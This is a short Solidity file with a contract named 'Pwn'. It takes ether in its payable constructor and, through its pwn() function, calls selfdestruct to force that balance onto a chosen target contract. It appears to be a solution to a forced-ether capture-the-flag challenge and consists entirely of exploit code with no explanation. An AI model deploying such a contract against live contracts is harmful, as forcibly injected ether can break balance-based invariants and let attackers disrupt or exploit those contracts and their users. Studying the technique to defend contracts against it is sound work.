// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Pwn {

    address payable private immutable target;

    constructor(address payable _target) payable {
        target = _target;
    }

    function pwn() external {
        selfdestruct(target);
    }
}